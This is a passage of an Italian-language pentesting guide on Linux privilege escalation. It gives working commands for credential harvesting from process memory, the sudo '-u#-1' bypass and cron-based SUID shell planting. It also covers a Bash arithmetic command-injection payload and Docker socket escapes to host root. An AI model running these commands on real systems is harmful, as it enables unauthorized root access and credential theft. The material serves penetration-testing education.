# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informazioni sul sistema

### Informazioni sul sistema operativo

Iniziamo a raccogliere informazioni sul sistema operativo in esecuzione.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Se **hai permessi di scrittura su qualsiasi cartella all'interno della variabile `PATH`** potresti essere in grado di dirottare alcune librerie o binari:
```bash
echo $PATH
```
### Info ambiente

Informazioni interessanti, password o chiavi API nelle variabili d'ambiente?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Controlla la versione del kernel e verifica se esiste qualche exploit che può essere usato per ottenere privilegi elevati.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puoi trovare una buona lista di kernel vulnerabili e alcuni **compiled exploits** qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Altri siti dove puoi trovare alcuni **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Per estrarre tutte le versioni del kernel vulnerabili da quel sito puoi fare:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Strumenti che possono aiutare a cercare kernel exploits sono:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (da eseguire IN victim, verifica solo exploit per kernel 2.x)

Cerca sempre **la versione del kernel su Google**, magari la tua versione del kernel è menzionata in qualche exploit del kernel e così sarai sicuro che questo exploit sia valido.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Basato sulle versioni vulnerabili di sudo che compaiono in:
```bash
searchsploit sudo
```
Puoi verificare se la versione di sudo è vulnerabile usando questo grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

Da @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verifica della firma non riuscita

Consulta **smasher2 box di HTB** per un **esempio** di come questa vuln potrebbe essere sfruttata
```bash
dmesg 2>/dev/null | grep "signature"
```
### Ulteriore enumerazione del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Elencare le possibili difese

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Se sei all'interno di un docker container puoi provare a evadere da esso:


{{#ref}}
docker-security/
{{#endref}}

## Unità

Controlla **cosa è montato e cosa non lo è**, dove e perché. Se qualcosa non è montato potresti provare a montarlo e verificare la presenza di informazioni private
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software utile

Elencare i binari utili
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Inoltre, verifica se è installato **qualche compilatore**. Questo è utile se devi usare qualche kernel exploit, poiché è consigliabile compilarlo sulla macchina in cui lo utilizzerai (o su una simile).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerabile installato

Controllare la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci qualche vecchia versione di Nagios (per esempio) che potrebbe essere sfruttata per escalating privileges…\
Si consiglia di controllare manualmente la versione dei software installati più sospetti.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se hai accesso SSH alla macchina puoi anche usare **openVAS** per controllare la presenza di software installato obsoleto o vulnerabile.

> [!NOTE] > _Nota che questi comandi mostreranno molte informazioni che saranno per lo più inutili, pertanto si consiglia l'uso di applicazioni come OpenVAS o simili che verifichino se la versione di un software installato è vulnerabile a exploit noti_

## Processi

Dai un'occhiata a **quali processi** vengono eseguiti e verifica se qualche processo ha **più privilegi del dovuto** (per esempio un tomcat eseguito da root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** in esecuzione, potresti abusarne per escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** le rileva controllando il parametro `--inspect` nella riga di comando del processo.\
Controlla anche i tuoi privilegi sui process binaries, magari puoi sovrascriverne qualcuno.

### Monitoraggio dei processi

Puoi usare strumenti come [**pspy**](https://github.com/DominicBreuker/pspy) per monitorare i processi. Questo può essere molto utile per identificare processi vulnerabili eseguiti frequentemente o quando viene soddisfatto un insieme di requisiti.

### Memoria dei processi

Alcuni servizi di un server salvano **credentials in clear text inside the memory**.\
Normalmente avrai bisogno di **root privileges** per leggere la memoria di processi che appartengono ad altri utenti, pertanto questo è solitamente più utile quando sei già root e vuoi scoprire altre credentials.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi che possiedi**.

> [!WARNING]
> Nota che oggi la maggior parte delle macchine **non permette ptrace di default** il che significa che non puoi effettuare il dump di altri processi che appartengono al tuo utente non privilegiato.
>
> Il file _**/proc/sys/kernel/yama/ptrace_scope**_ controlla l'accessibilità di ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Se hai accesso alla memoria di un servizio FTP (per esempio) potresti ottenere l'Heap e cercare al suo interno le credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script di GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Per un dato ID di processo, **maps mostrano come la memoria è mappata** nello spazio di indirizzi virtuale di quel processo; mostrano anche i **permessi di ogni regione mappata**. Il file pseudo **mem** **espone la memoria stessa del processo**. Dal file **maps** sappiamo quali **regioni di memoria sono leggibili** e i loro offset. Usando queste informazioni ci **posizioniamo nel file mem ed eseguiamo il dump di tutte le regioni leggibili** in un file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornisce l'accesso alla memoria **fisica** del sistema, non alla memoria virtuale. Lo spazio di indirizzi virtuali del kernel è accessibile tramite /dev/kmem.\
Tipicamente, `/dev/mem` è leggibile solo da **root** e dal gruppo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump per linux

ProcDump è una rivisitazione per Linux del classico strumento ProcDump della suite Sysinternals per Windows. Lo trovi in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Strumenti

Per eseguire il dump della memoria di un processo puoi utilizzare:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puoi rimuovere manualmente i requisiti di root ed eseguire il dump del processo di tua proprietà
- Script A.5 da [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (richiede root)

### Credenziali dalla memoria del processo

#### Esempio manuale

Se trovi che il processo authenticator è in esecuzione:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puoi eseguire il dump del processo (vedi le sezioni precedenti per trovare diversi modi per eseguire il dump della memoria di un processo) e cercare credenziali all'interno della memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Lo strumento [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) ruba **credenziali in chiaro dalla memoria** e da alcuni **file ben noti**. Richiede privilegi root per funzionare correttamente.

| Funzionalità                                      | Nome processo        |
| ------------------------------------------------- | -------------------- |
| Password GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Connessioni FTP attive)                   | vsftpd               |
| Apache2 (Sessioni HTTP Basic Auth attive)         | apache2              |
| OpenSSH (Sessioni SSH attive - Uso di sudo)       | sshd:                |

#### Regex di ricerca/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Operazioni programmate/Cron jobs

### Crontab UI (alseambusher) in esecuzione come root – web-based scheduler privesc

Se un pannello web “Crontab UI” (alseambusher/crontab-ui) viene eseguito come root ed è legato solo al loopback, puoi comunque raggiungerlo tramite SSH local port-forwarding e creare un job privilegiato per effettuare un'escalation dei privilegi.

Catena tipica
- Individuare una porta accessibile solo da loopback (es., 127.0.0.1:8000) e il realm Basic-Auth tramite `ss -ntlp` / `curl -v localhost:8000`
- Trovare credenziali in artifact operativi:
- Backups/scripts con `zip -P <password>`
- unità systemd che espone `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel e login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un job high-priv e eseguilo immediatamente (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Usalo:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Non eseguire Crontab UI come root; limitane l'uso a un utente dedicato con permessi minimi
- Legare a localhost e limitare ulteriormente l'accesso tramite firewall/VPN; non riusare le password
- Evita di inserire secrets nei unit files; usa secret stores o un EnvironmentFile accessibile solo da root
- Abilita audit/logging per le esecuzioni on-demand dei job

Controlla se qualche scheduled job è vulnerabile. Forse puoi sfruttare uno script eseguito da root (wildcard vuln? puoi modificare file che root usa? usare symlinks? creare file specifici nella directory che root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Per esempio, all'interno di _/etc/crontab_ puoi trovare il PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota come l'utente "user" ha privilegi di scrittura su /home/user_)

Se all'interno di questo crontab l'utente root prova a eseguire un comando o uno script senza impostare il PATH. Per esempio: _\* \* \* \* root overwrite.sh_\
Allora, puoi ottenere una root shell usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron che utilizza uno script con un wildcard (Wildcard Injection)

Se uno script eseguito da root contiene un “**\***” all'interno di un comando, puoi sfruttarlo per far accadere cose inaspettate (come privesc). Esempio:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se il wildcard è preceduto da un percorso come** _**/some/path/\***_ **, non è vulnerabile (nemmeno** _**./\***_ **lo è).**

Leggi la pagina seguente per altri trucchi di exploitation dei wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash esegue parameter expansion e command substitution prima della valutazione aritmetica in ((...)), $((...)) e let. Se un cron/parser eseguito come root legge campi di log non affidabili e li passa in un contesto aritmetico, un attacker può iniettare una command substitution $(...) che verrà eseguita come root quando il cron viene eseguito.

- Perché funziona: In Bash, le expansion avvengono in questo ordine: parameter/variable expansion, command substitution, arithmetic expansion, poi word splitting e pathname expansion. Quindi un valore come `$(/bin/bash -c 'id > /tmp/pwn')0` viene prima sostituito (eseguendo il comando), poi il rimanente numerico `0` viene usato per l'aritmetica così lo script continua senza errori.

- Pattern tipico vulnerabile:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Sfruttamento: Fai scrivere testo controllato dall'attacker nel log parsato in modo che il campo che sembra numerico contenga una command substitution e finisca con una cifra. Assicurati che il tuo comando non stampi su stdout (o reindirizzalo) in modo che l'aritmetica rimanga valida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Se **puoi modificare uno script cron** eseguito da root, puoi ottenere una shell molto facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se lo script eseguito da root utilizza una **directory alla quale hai pieno accesso**, potrebbe essere utile eliminare quella cartella e **creare un symlink verso un'altra cartella** che serva uno script controllato da te
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron job frequenti

Puoi monitorare i processi per cercare quelli che vengono eseguiti ogni 1, 2 o 5 minuti. Potresti approfittarne per elevare i privilegi.

Ad esempio, per **monitorare ogni 0.1s per 1 minuto**, **ordinare in base ai comandi meno eseguiti** e eliminare i comandi che sono stati eseguiti di più, puoi fare:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Puoi anche usare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (monitorerà ed elencherà ogni processo che viene avviato).

### Cron jobs invisibili

È possibile creare un cronjob **mettendo un carriage return dopo un commento** (senza il carattere di nuova riga), e il cron job funzionerà. Esempio (nota il carattere carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servizi

### File _.service_ scrivibili

Verifica se puoi scrivere qualsiasi file `.service`, se puoi, **potresti modificarlo** così che **esegua** la tua **backdoor quando** il servizio è **avviato**, **riavviato** o **arrestato** (potrebbe essere necessario aspettare il riavvio della macchina).\
Ad esempio crea la tua backdoor all'interno del file `.service` con **`ExecStart=/tmp/script.sh`**

### Binari di servizio scrivibili

Tieni presente che se hai **permessi di scrittura sui binari eseguiti dai servizi**, puoi modificarli per inserire backdoors così quando i servizi vengono rieseguiti le backdoors verranno eseguite.

### systemd PATH - Percorsi relativi

Puoi vedere il PATH usato da **systemd** con:
```bash
systemctl show-environment
```
Se scopri di poter **scrivere** in una qualsiasi delle cartelle del percorso, potresti essere in grado di **escalate privileges**. Devi cercare **percorsi relativi usati nei file di configurazione dei servizi** come:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Poi crea un **executable** con lo **stesso nome del binario relativo** nella cartella systemd PATH che puoi scrivere, e quando il servizio viene chiamato a eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), la tua **backdoor verrà eseguita** (gli utenti non privilegiati di solito non possono avviare/fermare servizi ma verifica se puoi usare `sudo -l`).

**Per saperne di più sui servizi usa `man systemd.service`.**

## **Timer**

I **Timer** sono unit file di systemd il cui nome termina con `**.timer**` e che controllano file `**.service**` o eventi. I **Timer** possono essere usati come alternativa a cron, poiché offrono supporto integrato per eventi basati sul calendario e per eventi a tempo monotono e possono essere eseguiti in modo asincrono.

Puoi enumerare tutti i timer con:
```bash
systemctl list-timers --all
```
### Timer scrivibili

Se puoi modificare un timer, puoi far sì che esegua alcune unità esistenti di systemd.unit (come un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
Nella documentazione puoi leggere cosa sia l'Unit:

> L'unità da attivare quando questo timer scade. L'argomento è un nome di unità, il cui suffisso non è ".timer". Se non specificato, questo valore di default corrisponde a un service che ha lo stesso nome dell'unità timer, eccetto il suffisso. (Vedi sopra.) Si raccomanda che il nome dell'unità che viene attivata e il nome dell'unità del timer siano identici, eccetto il suffisso.

Pertanto, per abusare di questa autorizzazione dovresti:

- Trova qualche unità systemd (come una `.service`) che stia **eseguendo un binario scrivibile**
- Trova qualche unità systemd che stia **eseguendo un percorso relativo** e su cui hai **privilegi di scrittura** sulla **systemd PATH** (per impersonare quell'eseguibile)

**Per saperne di più sui timer usa `man systemd.timer`.**

### **Abilitare il timer**

Per abilitare un timer sono necessari i privilegi di root ed è necessario eseguire:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Nota che il **timer** è **attivato** creando un symlink a esso su `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) consentono la **comunicazione tra processi** sulla stessa macchina o su macchine diverse all'interno di modelli client-server. Utilizzano i normali file descriptor Unix per la comunicazione inter-computer e vengono configurati tramite file `.socket`.

Sockets possono essere configurati usando file `.socket`.

**Per saperne di più sui sockets usa `man systemd.socket`.** All'interno di questo file, possono essere configurati diversi parametri interessanti:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Queste opzioni sono diverse tra loro ma in sintesi servono a **indicare dove verrà effettuato il listen** sul socket (il path del file AF_UNIX socket, l'IPv4/6 e/o il numero di porta da ascoltare, ecc.).
- `Accept`: Accetta un argomento booleano. Se **true**, viene **generata un'istanza di service per ogni connessione in ingresso** e solo il socket della connessione viene passato a quella istanza. Se **false**, tutti i socket di ascolto vengono **passati all'unità di servizio avviata**, e viene generata una sola unità di servizio per tutte le connessioni. Questo valore è ignorato per i datagram socket e le FIFO, dove una singola unità di servizio gestisce incondizionatamente tutto il traffico in ingresso. **Di default false**. Per ragioni di performance, è consigliato scrivere nuovi daemon in modo compatibile con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Accettano una o più righe di comando, che vengono **eseguite prima** o **dopo** che i **socket**/FIFO di ascolto vengono **creati** e collegati (bound), rispettivamente. Il primo token della riga di comando deve essere un nome di file assoluto, seguito dagli argomenti per il processo.
- `ExecStopPre`, `ExecStopPost`: Comandi aggiuntivi che vengono **eseguiti prima** o **dopo** che i **socket**/FIFO di ascolto vengono **chiusi** e rimossi, rispettivamente.
- `Service`: Specifica il nome dell'unità di **service** **da attivare** sul **traffico in ingresso**. Questa impostazione è consentita solo per socket con Accept=no. Di default punta al service che ha lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi non è necessario usare questa opzione.

### File .socket scrivibili

Se trovi un file `.socket` **scrivibile** puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa come: `ExecStartPre=/home/kali/sys/backdoor` e il backdoor verrà eseguito prima che il socket venga creato. Pertanto, **probabilmente dovrai aspettare il riavvio della macchina.**\
_Nota che il sistema deve effettivamente usare quella configurazione del file socket oppure il backdoor non verrà eseguito_

### Sockets scrivibili

Se **identifichi un socket scrivibile** (_ora stiamo parlando di Unix Sockets e non dei file di configurazione `.socket`_), allora **puoi comunicare** con quel socket e magari sfruttare una vulnerabilità.

### Enumerare Unix Sockets
```bash
netstat -a -p --unix
```
### Connessione raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Nota che potrebbero esserci alcuni **sockets listening for HTTP** requests (_non mi riferisco ai file .socket ma ai file che fungono da unix sockets_). Puoi verificarlo con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se la socket **risponde a una richiesta HTTP**, allora puoi **comunicare** con essa e magari **sfruttare qualche vulnerabilità**.

### Docker socket scrivibile

Il Docker socket, spesso presente in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Di default, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Avere accesso in scrittura a questo socket può portare a privilege escalation. Ecco una panoramica di come ciò può essere fatto e dei metodi alternativi se il Docker CLI non è disponibile.

#### **Privilege Escalation with Docker CLI**

Se hai accesso in scrittura al Docker socket, puoi ottenere privilege escalation usando i seguenti comandi:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Questi comandi consentono di eseguire un container con accesso root al file system dell'host.

#### **Utilizzo diretto della Docker API**

Quando il Docker CLI non è disponibile, è comunque possibile manipolare il socket di Docker usando la Docker API e comandi `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Avvia il container appena creato:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Dopo aver stabilito la connessione `socat`, puoi eseguire comandi direttamente nel container con accesso root al file system dell'host.

### Altro

Nota che se hai permessi di scrittura sul docker socket perché sei **inside the group `docker`** hai [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Se la [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Controlla **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus è un sofisticato sistema di inter-Process Communication (IPC) che permette alle applicazioni di interagire e condividere dati in modo efficiente. Progettato per i sistemi Linux moderni, offre un framework robusto per diverse forme di comunicazione tra applicazioni.

Il sistema è versatile, supportando IPC di base che migliora lo scambio di dati tra processi, in modo analogo a socket di dominio UNIX potenziati. Inoltre, aiuta nella broadcast di eventi o segnali, favorendo l'integrazione tra componenti di sistema. Ad esempio, un segnale da un daemon Bluetooth riguardo una chiamata in entrata può indurre un lettore multimediale a disattivare l'audio, migliorando l'esperienza utente. Inoltre, D-Bus supporta un sistema di oggetti remoti, semplificando richieste di servizio e invocazioni di metodi tra applicazioni, snellendo processi che tradizionalmente erano complessi.

D-Bus opera su un modello di allow/deny, gestendo i permessi dei messaggi (chiamate di metodo, emissione di segnali, ecc.) basandosi sull'effetto cumulativo delle regole di policy corrispondenti. Queste policy specificano le interazioni con il bus e possono potenzialmente permettere escalation di privilegi tramite lo sfruttamento di tali permessi.

Un esempio di tale policy in /etc/dbus-1/system.d/wpa_supplicant.conf è fornito, dettagliando i permessi per l'utente root di possedere, inviare e ricevere messaggi da fi.w1.wpa_supplicant1.

Le policy senza un utente o gruppo specificato si applicano universalmente, mentre le policy nel contesto "default" si applicano a tutti coloro che non sono coperti da altre policy specifiche.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Impara come enumerare e sfruttare una comunicazione D-Bus qui:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rete**

È sempre utile enumerare la rete e capire la posizione della macchina.

### Enumerazione generica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Porte aperte

Controlla sempre i servizi di rete in esecuzione sulla macchina con cui non sei riuscito a interagire prima di accedervi:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifica se puoi sniffare il traffico. Se ci riesci, potresti essere in grado di ottenere alcune credenziali.
```
timeout 1 tcpdump
```
## Utenti

### Enumerazione generica

Controlla **chi** sei, quali **privilegi** hai, quali **utenti** sono nei sistemi, quali possono effettuare il **login** e quali hanno i **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
